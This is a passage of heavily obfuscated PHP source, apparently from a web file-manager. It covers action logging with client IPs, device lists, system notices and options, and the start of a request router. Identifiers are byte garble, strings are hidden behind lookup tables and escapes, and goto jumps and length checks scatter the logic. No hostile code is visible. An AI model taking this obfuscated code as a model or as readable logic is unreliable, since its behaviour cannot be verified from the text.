LNG($™ë¤İ‰É[2341]), $™ë¤İ‰É[2342] => LNG($™ë¤İ‰É[2343]), $™ë¤İ‰É[2344] => LNG($™ë¤İ‰É[2345]), $™ë¤İ‰É[2346] => LNG($™ë¤İ‰É[2347]), $™ë¤İ‰É[2348] => LNG($™ë¤İ‰É[2349]), $™ë¤İ‰É[1932] => LNG($™ë¤İ‰É[2350]), $™ë¤İ‰É[2351] => LNG($™ë¤İ‰É[2352]), $™ë¤İ‰É[1939] => LNG($™ë¤İ‰É[2353]), $™ë¤İ‰É[2354] => LNG($™ë¤İ‰É[2355]), $™ë¤İ‰É[2356] => LNG($™ë¤İ‰É[2357]), $™ë¤İ‰É[2358] => LNG($™ë¤İ‰É[2359]), $™ë¤İ‰É[2360] => LNG($™ë¤İ‰É[2361]), $™ë¤İ‰É[1942] => LNG($™ë¤İ‰É[2362]), $™ë¤İ‰É[1943] => LNG($™ë¤İ‰É[2363]), $™ë¤İ‰É[2364] => LNG($™ë¤İ‰É[2365]), $™ë¤İ‰É[2366] => LNG($™ë¤İ‰É[2367]), $™ë¤İ‰É[2368] => LNG($™ë¤İ‰É[2369]), $™ë¤İ‰É[1937] => LNG($™ë¤İ‰É[2370]), $™ë¤İ‰É[2371] => LNG($™ë¤İ‰É[2372]), $™ë¤İ‰É[1936] => LNG($™ë¤İ‰É[2373]), $™ë¤İ‰É[2374] => LNG($™ë¤İ‰É[2375]), $™ë¤İ‰É[2376] => LNG($™ë¤İ‰É[2377]), $™ë¤İ‰É[2378] => LNG($™ë¤İ‰É[2377]), $™ë¤İ‰É[2379] => LNG($™ë¤İ‰É[2380]), $™ë¤İ‰É[2381] => LNG($™ë¤İ‰É[2381]), $™ë¤İ‰É[2382] => LNG($™ë¤İ‰É[1908]), $™ë¤İ‰É[2383] => LNG($™ë¤İ‰É[2384]), $™ë¤İ‰É[2385] => LNG($™ë¤İ‰É[2386]), $™ë¤İ‰É[2387] => LNG($™ë¤İ‰É[2388]), $™ë¤İ‰É[2389] => LNG($™ë¤İ‰É[2390]), $™ë¤İ‰É[2391] => LNG($™ë¤İ‰É[2392]), $™ë¤İ‰É[2393] => LNG($™ë¤İ‰É[2393]), $™ë¤İ‰É[2394] => LNG($™ë¤İ‰É[2395]), $™ë¤İ‰É[2396] => LNG($™ë¤İ‰É[2397]), $™ë¤İ‰É[2398] => LNG($™ë¤İ‰É[2399]), $™ë¤İ‰É[2400] => LNG($™ë¤İ‰É[2401]), $™ë¤İ‰É[2402] => LNG($™ë¤İ‰É[2403]), $™ë¤İ‰É[2404] => LNG($™ë¤İ‰É[2405]), $™ë¤İ‰É[212] => LNG($™ë¤İ‰É[212]), $™ë¤İ‰É[213] => LNG($™ë¤İ‰É[2406]), $™ë¤İ‰É[2407] => LNG($™ë¤İ‰É[2407])); } private function typeFile() { $Ş›“÷Ã° =& $_SERVER[ˆ¡¹µ‹Â]; $ã…«¹ı· = array($Ş›“÷Ã°[1939] => array($Ş›“÷Ã°[1940]), $Ş›“÷Ã°[2346] => array($Ş›“÷Ã°[2408]), $Ş›“÷Ã°[2348] => array($Ş›“÷Ã°[2409]), $Ş›“÷Ã°[1932] => array($Ş›“÷Ã°[1933], $Ş›“÷Ã°[2410]), $Ş›“÷Ã°[2356] => array(), $Ş›“÷Ã°[2358] => array(), $Ş›“÷Ã°[2360] => array(), $Ş›“÷Ã°[1942] => array($Ş›“÷Ã°[1944]), $Ş›“÷Ã°[1943] => array($Ş›“÷Ã°[1944]), $Ş›“÷Ã°[2364] => array($Ş›“÷Ã°[2411]), $Ş›“÷Ã°[2366] => array($Ş›“÷Ã°[2411]), $Ş›“÷Ã°[2368] => array($Ş›“÷Ã°[2412]), $Ş›“÷Ã°[2354] => array($Ş›“÷Ã°[2413]), $Ş›“÷Ã°[1937] => array($Ş›“÷Ã°[2414]), $Ş›“÷Ã°[2371] => array($Ş›“÷Ã°[2415]), $Ş›“÷Ã°[1936] => array($Ş›“÷Ã°[1938])); return $ã…«¹ı·; } private function typeAll() { $ùÂ–¤£³ =& $_SERVER[ˆ¡¹µ‹Â]; $œÒô«û = $this->typeList; $…í«±Í = array_filter($this->typeFile()); foreach ($…í«±Í as $µÖ¹·Ãã => $ËÆ¼šÆú) { $œÒô«û[$ËÆ¼šÆú[0]] = $œÒô«û[$µÖ¹·Ãã]; } $œÒô«û[$ùÂ–¤£³[1944]] = LNG($ùÂ–¤£³[2416]); $œÒô«û[$ùÂ–¤£³[2411]] = LNG($ùÂ–¤£³[2417]); return $œÒô«û; } public function addLog($•ä®èà, $™äƒ„ì = array()) { $å¹¹ïâ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($this->typeList[$•ä®èà])) { return; } $‚õ³æÅ = Session::get($å¹¹ïâ[2104]); if (!$‚õ³æÅ) { $‚õ³æÅ = _get($™äƒ„ì, $å¹¹ïâ[1763], 0); } if ($•ä®èà == $å¹¹ïâ[2383] && is_array($™äƒ„ì[$å¹¹ïâ[2418]]) && !$™äƒ„ì[$å¹¹ïâ[2418]]) { return; } $İ™Š²Ã¶ = get_client_ip(); if (!$™äƒ„ì || strlen(json_encode($™äƒ„ì)) >= 1024 * 64) { if ($™äƒ„ì && is_array($™äƒ„ì)) { $™äƒ„ì = array_intersect_key($™äƒ„ì, array_flip($å¹¹ïâ[475], $å¹¹ïâ[32])); $™äƒ„ì[$å¹¹ïâ[2419]] = $İ™Š²Ã¶; } else { $™äƒ„ì = array($å¹¹ïâ[2419] => $İ™Š²Ã¶); } } else { if (is_array($™äƒ„ì)) { $™äƒ„ì[$å¹¹ïâ[2419]] = $İ™Š²Ã¶; } else { $™äƒ„ì = array($å¹¹ïâ[1280] => $™äƒ„ì, $å¹¹ïâ[2419] => $İ™Š²Ã¶); } } $™äƒ„ì = array($å¹¹ïâ[1753] => Session::sign(), $å¹¹ïâ[1754] => intval($‚õ³æÅ), $å¹¹ïâ[33] => $•ä®èà, $å¹¹ïâ[1756] => json_encode($™äƒ„ì)); parent::add($™äƒ„ì); } public function remove($Ş—ıŠ™Ú) { $this->where(array($_SERVER[ˆ¡¹µ‹Â][493] => $Ş—ıŠ™Ú))->delete(); } private function _makeOrder($€Õ¡É¨  = '') { $¾Ğ‡¯Ïã =& $_SERVER[ˆ¡¹µ‹Â]; $ÂæÙ‘º¯ = $¾Ğ‡¯Ïã[231]; $ıâèÈˆŞ = array($¾Ğ‡¯Ïã[523] => $¾Ğ‡¯Ïã[524], $¾Ğ‡¯Ïã[525] => $¾Ğ‡¯Ïã[526]); $øÄ‡ø¦ª = Input::get($¾Ğ‡¯Ïã[531], $¾Ğ‡¯Ïã[7], $¾Ğ‡¯Ïã[2140], array($¾Ğ‡¯Ïã[2057], $¾Ğ‡¯Ïã[525])); $øÄ‡ø¦ª = $ıâèÈˆŞ[$øÄ‡ø¦ª]; $€Õ¡É¨  = $€Õ¡É¨  . "{$ÂæÙ‘º¯}\40{$øÄ‡ø¦ª}"; return $this->order($€Õ¡É¨ ); } public function get($²òÎ•ŸÚ = '') { $ùÄí‚Ğæ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$²òÎ•ŸÚ) { show_json(array()); } $°¡ï¤— = array(); if ($²òÎ•ŸÚ[$ùÄí‚Ğæ[1763]]) { $°¡ï¤—[$ùÄí‚Ğæ[1763]] = $²òÎ•ŸÚ[$ùÄí‚Ğæ[1763]]; } if (isset($²òÎ•ŸÚ[$ùÄí‚Ğæ[827]])) { $ÇêÊ“ø = $²òÎ•ŸÚ[$ùÄí‚Ğæ[827]]; $Ç¬í ¿ = isset($²òÎ•ŸÚ[$ùÄí‚Ğæ[828]]) ? $²òÎ•ŸÚ[$ùÄí‚Ğæ[828]] : time(); $°¡ï¤—[$ùÄí‚Ğæ[231]] = array($ùÄí‚Ğæ[409], array($ÇêÊ“ø, $Ç¬í ¿)); } if ($²òÎ•ŸÚ[$ùÄí‚Ğæ[33]]) { $ºØ½’«¨ = explode($ùÄí‚Ğæ[50], $²òÎ•ŸÚ[$ùÄí‚Ğæ[33]]); $Àè¯Ì‹î = $this->typeFile(); $çÎú = array(); foreach ($ºØ½’«¨ as $Öì‘ô¼Š) { $çÎú[] = $Öì‘ô¼Š; if (isset($Àè¯Ì‹î[$Öì‘ô¼Š])) { $çÎú = array_merge($çÎú, $Àè¯Ì‹î[$Öì‘ô¼Š]); } } $çÎú = array_unique($çÎú); if ($çÎú) { $°¡ï¤—[$ùÄí‚Ğæ[33]] = array($ùÄí‚Ğæ[7], $çÎú); } } else { $°¡ï¤—[$ùÄí‚Ğæ[33]] = array($ùÄí‚Ğæ[2420], $ùÄí‚Ğæ[2421]); } if (!empty($²òÎ•ŸÚ[$ùÄí‚Ğæ[2419]])) { $°¡ï¤—[$ùÄí‚Ğæ[526]] = array($ùÄí‚Ğæ[459], "\x25{$²òÎ•ŸÚ[$ùÄí‚Ğæ[2419]]}\x25"); } $ğ÷·Œ®« = $this->_makeOrder()->where($°¡ï¤—)->selectPage(); if (empty($ğ÷·Œ®«[$ùÄí‚Ğæ[445]])) { show_json(array(), !0, $ğ÷·Œ®«[$ùÄí‚Ğæ[442]]); } $ğ÷·Œ®«[$ùÄí‚Ğæ[445]] = $this->logList($ğ÷·Œ®«[$ùÄí‚Ğæ[445]]); return $ğ÷·Œ®«; } private function ipAddress(&$¦¿Ëèƒ) { $õƒê–Ğœ =& $_SERVER[ˆ¡¹µ‹Â]; if (!empty($¦¿Ëèƒ[$õƒê–Ğœ[2419]])) { $ÂØï›‰Î = IpLocation::get($¦¿Ëèƒ[$õƒê–Ğœ[2419]]); } else { $ÂØï›‰Î = LNG($õƒê–Ğœ[2422]); } $¦¿Ëèƒ[$õƒê–Ğœ[2423]] = $ÂØï›‰Î; } private function descZipDownload($Ğßı€Öà, &$±’…ışê) { $Æ¯ŒÕÆ± =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($Ğßı€Öà[$Æ¯ŒÕÆ±[2424]])) { return; } $–«À³çµ = json_decode($Ğßı€Öà[$Æ¯ŒÕÆ±[2424]], !0); foreach ($–«À³çµ as $àÍç‡¬) { try { $´µíÏÃ = IO::infoFullSimple($àÍç‡¬[$Æ¯ŒÕÆ±[87]]); } catch (Exception $ÍÑğ¸é) { continue; } $Ğßı€Öà[$Æ¯ŒÕÆ±[87]] = $àÍç‡¬[$Æ¯ŒÕÆ±[87]]; $±’…ışê[] = $Ğßı€Öà[$Æ¯ŒÕÆ±[193]] = $´µíÏÃ[$Æ¯ŒÕÆ±[193]]; $±’…ışê[] = $Ğßı€Öà[$Æ¯ŒÕÆ±[2196]] = $´µíÏÃ[$Æ¯ŒÕÆ±[192]]; break; } return $Ğßı€Öà; } private function getSourceList(&$³¸ıØË·) { $ì²äï¦‰ =& $_SERVER[ˆ¡¹µ‹Â]; $…˜ı‚Ğ’ = array(); foreach ($³¸ıØË· as $³‚É·Ù => $Åâ›«ˆ) { $½º„“ş = json_decode($Åâ›«ˆ[$ì²äï¦‰[526]], !0); if ($Åâ›«ˆ[$ì²äï¦‰[33]] == $ì²äï¦‰[1935]) { $½º„“ş = $this->descZipDownload($½º„“ş, $…˜ı‚Ğ’); $³¸ıØË·[$³‚É·Ù][$ì²äï¦‰[526]] = json_encode($½º„“ş); continue; } if (strpos($Åâ›«ˆ[$ì²äï¦‰[33]], $ì²äï¦‰[2198]) !== 0) { if (!isset($½º„“ş[$ì²äï¦‰[87]]) || strpos($Åâ›«ˆ[$ì²äï¦‰[33]], $ì²äï¦‰[2425]) !== 0) { continue; } try { $ÛÉ«Ş€Ú = IO::infoFullSimple($½º„“ş[$ì²äï¦‰[87]]); } catch (Exception $®Ì˜§–æ) { continue; } $…˜ı‚Ğ’[] = $½º„“ş[$ì²äï¦‰[193]] = $ÛÉ«Ş€Ú[$ì²äï¦‰[193]]; $…˜ı‚Ğ’[] = $½º„“ş[$ì²äï¦‰[2196]] = $ÛÉ«Ş€Ú[$ì²äï¦‰[192]]; $³¸ıØË·[$³‚É·Ù][$ì²äï¦‰[526]] = json_encode($½º„“ş); continue; } $…˜ı‚Ğ’[] = $½º„“ş[$ì²äï¦‰[193]]; $…˜ı‚Ğ’[] = $½º„“ş[$ì²äï¦‰[2196]]; if ($½º„“ş[$ì²äï¦‰[33]] == $ì²äï¦‰[620]) { $…˜ı‚Ğ’[] = $½º„“ş[$ì²äï¦‰[526]][$ì²äï¦‰[1234]]; $…˜ı‚Ğ’[] = $½º„“ş[$ì²äï¦‰[526]][$ì²äï¦‰[1235]]; } if ($½º„“ş[$ì²äï¦‰[33]] == $ì²äï¦‰[2207]) { $…˜ı‚Ğ’[] = $½º„“ş[$ì²äï¦‰[526]][$ì²äï¦‰[193]]; } } if (!$…˜ı‚Ğ’) { return array(); } return Model($ì²äï¦‰[899])->sourceListInfo($…˜ı‚Ğ’, !0); } private function logList($Ôñô­¯Ã) { $Í÷×ª» =& $_SERVER[ˆ¡¹µ‹Â]; $ú»äçÇË = array_to_keyvalue($Ôñô­¯Ã, $Í÷×ª»[12], $Í÷×ª»[1763]); $—óßª× = Model($Í÷×ª»[598])->userListInfo(array_unique($ú»äçÇË)); $¥ƒãÇ®¾ = $this->getSourceList($Ôñô­¯Ã); $Èê¸ˆ™è = $this->typeAll(); $èÙìç À = array(); $†ç¨î‚ = array(); foreach ($Ôñô­¯Ã as $ŒßÙ©ö => $ÒÜÆŒà¨) { $ú œ¸§ª = $ÒÜÆŒà¨[$Í÷×ª»[33]]; $«¼ˆ¶ãø = isset($—óßª×[$ÒÜÆŒà¨[$Í÷×ª»[1763]]]) ? $—óßª×[$ÒÜÆŒà¨[$Í÷×ª»[1763]]] : !1; $Ò°ÀµÉÇ = strpos($ú œ¸§ª, $Í÷×ª»[2426]) === 0 ? LNG($Í÷×ª»[2427]) : LNG($Í÷×ª»[2422]); $ÒÜÆŒà¨[$Í÷×ª»[32]] = isset($«¼ˆ¶ãø[$Í÷×ª»[32]]) ? $«¼ˆ¶ãø[$Í÷×ª»[32]] : LNG($Í÷×ª»[2422]); $ÒÜÆŒà¨[$Í÷×ª»[2256]] = isset($«¼ˆ¶ãø[$Í÷×ª»[2256]]) ? $«¼ˆ¶ãø[$Í÷×ª»[2256]] : $Í÷×ª»[12]; $ÒÜÆŒà¨[$Í÷×ª»[1652]] = isset($Èê¸ˆ™è[$ú œ¸§ª]) ? $Èê¸ˆ™è[$ú œ¸§ª] : $Ò°ÀµÉÇ; $ÒÜÆŒà¨[$Í÷×ª»[2139]] = $«¼ˆ¶ãø; $ºô”å— = json_decode($ÒÜÆŒà¨[$Í÷×ª»[526]], !0); $ÒÜÆŒà¨[$Í÷×ª»[2419]] = isset($ºô”å—[$Í÷×ª»[2419]]) ? $ºô”å—[$Í÷×ª»[2419]] : $Í÷×ª»[12]; $ÒÜÆŒà¨[$Í÷×ª»[2423]] = IpLocation::get($ÒÜÆŒà¨[$Í÷×ª»[2419]]); if (strpos($ú œ¸§ª, $Í÷×ª»[2198]) === 0 || isset($ºô”å—[$Í÷×ª»[2196]])) { $ºô”å—[$Í÷×ª»[90]] = $¥ƒãÇ®¾[$ºô”å—[$Í÷×ª»[193]]]; $ºô”å—[$Í÷×ª»[2212]] = $¥ƒãÇ®¾[$ºô”å—[$Í÷×ª»[2196]]]; if ($ºô”å—[$Í÷×ª»[33]] == $Í÷×ª»[620]) { $ºô”å—[$Í÷×ª»[526]][$Í÷×ª»[1234]] = $¥ƒãÇ®¾[$ºô”å—[$Í÷×ª»[526]][$Í÷×ª»[1234]]]; $ºô”å—[$Í÷×ª»[526]][$Í÷×ª»[1235]] = $¥ƒãÇ®¾[$ºô”å—[$Í÷×ª»[526]][$Í÷×ª»[1235]]]; } if ($ºô”å—[$Í÷×ª»[33]] == $Í÷×ª»[2207]) { $ºô”å—[$Í÷×ª»[526]][$Í÷×ª»[193]] = $¥ƒãÇ®¾[$ºô”å—[$Í÷×ª»[526]][$Í÷×ª»[193]]]; } if ($ºô”å—[$Í÷×ª»[33]] == $Í÷×ª»[1930]) { $ºô”å—[$Í÷×ª»[2212]] = $ºô”å—[$Í÷×ª»[90]]; $ºô”å—[$Í÷×ª»[2196]] = $ºô”å—[$Í÷×ª»[2212]][$Í÷×ª»[193]]; $ºô”å—[$Í÷×ª»[90]] = !1; $ºô”å—[$Í÷×ª»[193]] = $Í÷×ª»[12]; } $ÛıÇ‰¹ = array($Í÷×ª»[1930], $Í÷×ª»[2194]); if (!in_array($ºô”å—[$Í÷×ª»[33]], $ÛıÇ‰¹)) { if ($ºô”å—[$Í÷×ª»[90]] && $ºô”å—[$Í÷×ª»[90]][$Í÷×ª»[190]] == $Í÷×ª»[191]) { $†ç¨î‚[] = $ÒÜÆŒà¨[$Í÷×ª»[475]]; unset($Ôñô­¯Ã[$ŒßÙ©ö]); continue; } if ($ºô”å—[$Í÷×ª»[2212]] && $ºô”å—[$Í÷×ª»[2212]][$Í÷×ª»[190]] == $Í÷×ª»[191]) { $†ç¨î‚[] = $ÒÜÆŒà¨[$Í÷×ª»[475]]; unset($Ôñô­¯Ã[$ŒßÙ©ö]); continue; } } } $ÒÜÆŒà¨[$Í÷×ª»[526]] = $ºô”å—; unset($ÒÜÆŒà¨[$Í÷×ª»[2428]]); $èÙìç À[] = $ÒÜÆŒà¨; } $this->clearSystemPathLog($†ç¨î‚); return $èÙìç À; } private function clearSystemPathLog($Ş„ªú´) { $‚æ·£ç² =& $_SERVER[ˆ¡¹µ‹Â]; if (count($Ş„ªú´) == 0) { return; } $À©•¬ŸÒ = array($‚æ·£ç²[475] => array($‚æ·£ç²[7], array_unique($Ş„ªú´))); $this->where($À©•¬ŸÒ)->delete(); } public function deviceList($Âø†×Ñ, $ŒÌóŸ« = 0) { $¦ıÄŒ =& $_SERVER[ˆ¡¹µ‹Â]; $—¼Ï‡“ñ = array($¦ıÄŒ[1763] => $Âø†×Ñ, $¦ıÄŒ[231] => array($¦ıÄŒ[1085], $ŒÌóŸ«), $¦ıÄŒ[33] => $¦ıÄŒ[1904]); $‰Êª”Ù“ = array(); $®…©Õäì = $this->field($¦ıÄŒ[2429])->where($—¼Ï‡“ñ)->order($¦ıÄŒ[2210])->limit(50)->select(); foreach ($®…©Õäì as $é’ö—Æ¸ => $¢â©á à) { if ($é’ö—Æ¸ > 0 && abs($¢â©á à[$¦ıÄŒ[231]] - $®…©Õäì[$é’ö—Æ¸ - 1][$¦ıÄŒ[231]]) < 5) { continue; } $†ÁÎÊ¸‚ = json_decode($¢â©á à[$¦ıÄŒ[526]], !0); $¢â©á à[$¦ıÄŒ[2419]] = isset($†ÁÎÊ¸‚[$¦ıÄŒ[2419]]) ? $†ÁÎÊ¸‚[$¦ıÄŒ[2419]] : $¦ıÄŒ[12]; unset($†ÁÎÊ¸‚[$¦ıÄŒ[2419]]); $æÒµôºä = $this->deviceType($†ÁÎÊ¸‚[$¦ıÄŒ[2199]]); if (isset($‰Êª”Ù“[$æÒµôºä])) { continue; } $¢â©á à[$¦ıÄŒ[2423]] = IpLocation::get($¢â©á à[$¦ıÄŒ[2419]]); $¢â©á à[$¦ıÄŒ[526]] = $†ÁÎÊ¸‚; $‰Êª”Ù“[$æÒµôºä] = $¢â©á à; } return array_values($‰Êª”Ù“); } public function deviceType($½»„‚ÓÎ) { return $½»„‚ÓÎ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\156\157\164\151\143\x65\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\143\157\x6e\x74\145\x6e\x74", "\x61\165\164\150", "\155\x6f\x64\145", "\x74\151\155\x65", "\164\171\x70\145", "\x6c\x65\x76\x65\x6c", "\x65\156\141\142\x6c\145", "\x73\x6f\x72\x74"); public function listData($Íñîßôº = false, $·ÏÆºì = "\163\x6f\x72\164", $ãÔ„¨àô = false) { return parent::listData($Íñîßôº, $·ÏÆºì, $ãÔ„¨àô); } public function add($¹Üê¬ÊÙ) { $Ô’ƒŞÇ =& $_SERVER[ˆ¡¹µ‹Â]; $²æœ”°ß = time(); if ($¹Üê¬ÊÙ[$Ô’ƒŞÇ[16]] == $Ô’ƒŞÇ[2430]) { $²æœ”°ß = strtotime($¹Üê¬ÊÙ[$Ô’ƒŞÇ[206]]); } $¹Üê¬ÊÙ[$Ô’ƒŞÇ[206]] = $²æœ”°ß; return parent::insert($¹Üê¬ÊÙ); } public function update($¾®şÓ´™, $†ÓßÜ¡) { $ÔØÂÊıö =& $_SERVER[ˆ¡¹µ‹Â]; $²ÒÒö…Ì = $this->listData($¾®şÓ´™); if (!$²ÒÒö…Ì) { return !1; } $§£Ñº€ˆ = time(); if ($†ÓßÜ¡[$ÔØÂÊıö[16]] == $ÔØÂÊıö[2430]) { $§£Ñº€ˆ = strtotime($†ÓßÜ¡[$ÔØÂÊıö[206]]); } $†ÓßÜ¡[$ÔØÂÊıö[206]] = $§£Ñº€ˆ; return parent::update($¾®şÓ´™, $†ÓßÜ¡); } public function remove($‰Æ’ñ´ø) { $ëÃìÇóã = $this->listData($‰Æ’ñ´ø); if (!$ëÃìÇóã || $ëÃìÇóã[$_SERVER[ˆ¡¹µ‹Â][191]]) { return !1; } return parent::remove($‰Æ’ñ´ø); } public function sort($æù·÷Ù¢, $õôÇŞ¬í) { return parent::update($æù·÷Ù¢, $õôÇŞ¬í); } public function enable($õĞúì¾ü, $åçÛ˜’Ÿ) { return parent::update($õĞúì¾ü, array($_SERVER[ˆ¡¹µ‹Â][2431] => $åçÛ˜’Ÿ)); } private function initUserOption() { $Óˆññ“ =& $_SERVER[ˆ¡¹µ‹Â]; $this->optionType = $Óˆññ“[2432]; $this->modelType = $Óˆññ“[2433]; $this->field = array($Óˆññ“[2434], $Óˆññ“[32], $Óˆññ“[206], $Óˆññ“[33], $Óˆññ“[2435], $Óˆññ“[817], $Óˆññ“[226]); } public function userNoticeGet($èûô· = false) { $this->initUserOption(); return parent::listData($èûô·, $_SERVER[ˆ¡¹µ‹Â][475], !0); } public function userNoticeAdd($Ú§ûíÏ) { $’áµù©  =& $_SERVER[ˆ¡¹µ‹Â]; $this->initUserOption(); $œ¥ƒÒ€Ã = $this->findByKey($’áµù© [2434], $Ú§ûíÏ[$’áµù© [475]]); if ($œ¥ƒÒ€Ã) { return !0; } $ÇÏÁØË€ = array($’áµù© [2434] => $Ú§ûíÏ[$’áµù© [475]], $’áµù© [32] => $Ú§ûíÏ[$’áµù© [32]], $’áµù© [206] => $Ú§ûíÏ[$’áµù© [206]], $’áµù© [33] => isset($Ú§ûíÏ[$’áµù© [33]]) ? $Ú§ûíÏ[$’áµù© [33]] : 1, $’áµù© [2435] => isset($Ú§ûíÏ[$’áµù© [2435]]) ? $Ú§ûíÏ[$’áµù© [2435]] : 0, $’áµù© [817] => 0, $’áµù© [226] => 0); return parent::insert($ÇÏÁØË€); } public function userNoticeEdit($Â›…«Ë, $§£İŠ¬­) { $this->initUserOption(); return parent::update($Â›…«Ë, $§£İŠ¬­); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\137\x6f\x70\x74\x69\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\157\x6c\x65", "\162\x6f\x6c\x65\x47\x72\x6f\165\x70", "\162\x65\x67\x69\163\164", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($˜‰ç×²¸) { return "\123\171\x73\x74\145\155\117\160\164\151\157\x6e\137{$˜‰ç×²¸}"; } protected function optionDefault($¿œ³ÒÄı = '') { $üïÖä¼í =& $_SERVER[ˆ¡¹µ‹Â]; if ($¿œ³ÒÄı == $üïÖä¼í[12]) { return $GLOBALS[$üïÖä¼í[6]][$üïÖä¼í[457]]; } } } goto b‰ÅÚï©Ã; d´Œôå»¸›: function binCheckBigger($òÍÉî­¶, $•ñ¸ƒÃ) { return $òÍÉî­¶ > $•ñ¸ƒÃ; } $_SERVER[$_SERVER[Û¼Ô…²][3]] = ("\x38\x35\x32\x37"."\x34\x31")+0;$_ptie="caq1nx5sbhjv8rel0fd3iwgtmuk92ypo647zkdcy2eivq83pz9sloa54hxjgm7b0n1ufrt6wiobu";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ˆ¦Âç¬º, $âªêë„) { $ç—Ö·–… =& $_SERVER[ˆ¡¹µ‹Â]; if (isset(self::$_methodList[$ˆ¦Âç¬º])) { return @call_user_func_array(self::$_methodList[$ˆ¦Âç¬º], $âªêë„); } else { if (method_exists($this, $ˆ¦Âç¬º)) { return call_user_func_array(array($this, $ˆ¦Âç¬º), $âªêë„); } else { think_exception(__CLASS__ . $ç—Ö·–…[4] . $ˆ¦Âç¬º . $ç—Ö·–…[5]); } } } public static function __callStatic($çÇ™µıÚ, $åĞ­ıÊ¾) { if (isset(self::$_methodListStatic[$çÇ™µıÚ])) { return call_user_func_array(self::$_methodListStatic[$çÇ™µıÚ], $åĞ­ıÊ¾); } else { if (method_exists(self, $çÇ™µıÚ)) { return call_user_func_array(array(self, $çÇ™µıÚ), $åĞ­ıÊ¾); } else { show_json("{$çÇ™µıÚ}\50\51\x20\156\x6f\164\40\x65\x78\151\x73\164\73", !1); } } } public static function addMethod($ıå‘Ê‡, $Ÿõ¡ô¿‡) { self::$_methodList[$ıå‘Ê‡] = $Ÿõ¡ô¿‡; } public static function addMethodStatic($Œë›ˆ¥, $Æı±ÁØ‚) { self::$_methodListStatic[$Œë›ˆ¥] = $Æı±ÁØ‚; } } goto Fê‡éİÎ¼™; D¯çğÖ£Ş»: if (strlen($znstewkolc) < $_SERVER[ˆ¡¹µ‹Â][683]) { return; } class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($ÕÆ‡Ìã) { $éƒ¹ƒ»É =& $_SERVER[ˆ¡¹µ‹Â]; $ëèÓÀòâ =& $_SERVER[ Ãœáã¬]; $»ÁÜëÒŞ = explode($ëèÓÀòâ[0], trim($ÕÆ‡Ìã, $ëèÓÀòâ[0])); $this->defaultModule = $»ÁÜëÒŞ[0] ? $»ÁÜëÒŞ[0] : $this->defaultModule; $Ğ¼ù¾¹« = $éƒ¹ƒ»É[684]; if (!$Ğ¼ù¾¹«) { return; } $this->defaultController = $»ÁÜëÒŞ[1] ? $»ÁÜëÒŞ[1] : $this->defaultController; $this->defaultAction = $»ÁÜëÒŞ[2] ? $»ÁÜëÒŞ[2] : $this->defaultAction; $this->uxkv77fc9f13($ëèÓÀòâ[1], array($this, $ëèÓÀòâ[2])); $ĞĞ¼¨éÅ = $éƒ¹ƒ»É[685]; } public function appRun($ì£¼´ö) { $İ€·¤ğÖ =& $_SERVER[ˆ¡¹µ‹Â]; $ñ“ññ‹ù =& $_SERVER[ Ãœáã¬]; $ù£éé‹ë = explode($ñ“ññ‹ù[0], $ì£¼´ö); $øÜ²ÇŞß = $İ€·¤ğÖ[686]; if (strlen($øÜ²ÇŞß) < $İ€·¤ğÖ[687]) { die; } $ËâĞÀ¸ = strtolower($ù£éé‹ë[0]); $±’˜ˆ¦ = $İ€·¤ğÖ[688]; if (strlen($±’˜ˆ¦) < $İ€·¤ğÖ[689]) { return; } $…ÚÕĞ¶£ = $ñ“ññ‹ù[3]; if ($ËâĞÀ¸ == $ñ“ññ‹ù[4]) { $…ÚÕĞ¶£ = $ñ“ññ‹ù[5]; $ù£éé‹ë[0] = $ñ“ññ‹ù[6]; $ù£éé‹ë[1] = $ù£éé‹ë[1] . $ñ“ññ‹ù[7]; $ì£¼´ö = join($ñ“ññ‹ù[0], $ù£éé‹ë); $ì£¼´ö = trim($ì£¼´ö, $ñ“ññ‹ù[0]); } call_user_func(array($ñ“ññ‹ù[8], $ñ“ññ‹ù[9]), $…ÚÕĞ¶£ . $ñ“ññ‹ù[10], $ì£¼´ö); ActionCall($ì£¼´ö); call_user_func(array($ñ“ññ‹ù[8], $ñ“ññ‹ù[9]), $…ÚÕĞ¶£ . $ñ“ññ‹ù[11], $ì£¼´ö); $Ë‡òşÓï = $İ€·¤ğÖ[690]; if (!$Ë‡òşÓï) { return; } } private function autorun() { $Æ¢î‚­Å =& $_SERVER[ˆ¡¹µ‹Â]; $Û…¾™£Â =& $_SERVER[ Ãœáã¬]; global $config; $ÒõšÎ•” = $Æ¢î‚­Å[691]; if (strlen($ÒõšÎ•”) < $Æ¢î‚­Å[692]) { die; } if (count($config[$Û…¾™£Â[12]]) == 0) { return; } foreach ($config[$Û…¾™£Â[12]] as $çÆºååó => $¯í¬Î÷°) { $this->appRun($¯í¬Î÷°); } } private function ovzxb3d587ad() { $÷±¥ãÂ =& $_SERVER[ˆ¡¹µ‹Â]; $—˜¢ÌÎî =& $_SERVER[ Ãœáã¬]; $¦Ëû“Ğ = $—˜¢ÌÎî[4]; $É”‰øñÕ = $÷±¥ãÂ[693]; if (strlen($É”‰øñÕ) < $÷±¥ãÂ[689]) { die; } $çİÖƒ‹ = $GLOBALS[$—˜¢ÌÎî[13]][$—˜¢ÌÎî[14]][0]; if (!$çİÖƒ‹ || strlen($çİÖƒ‹) <= strlen($¦Ëû“Ğ)) { return; } if (strtolower(substr($çİÖƒ‹, -strlen($¦Ëû“Ğ))) != $¦Ëû“Ğ) { return; } $Á«ğñ‡© = substr($çİÖƒ‹, 0, -strlen($¦Ëû“Ğ)); $É™öôîè = $÷±¥ãÂ[694]; if (!$É™öôîè) { return; } $äÆáëß = array($—˜¢ÌÎî[4], $Á«ğñ‡©); $Ô°â­À¾ = $÷±¥ãÂ[695]; $Æ»Î³Ş´ = array_slice($GLOBALS[$—˜¢ÌÎî[13]][$—˜¢ÌÎî[14]], 1); 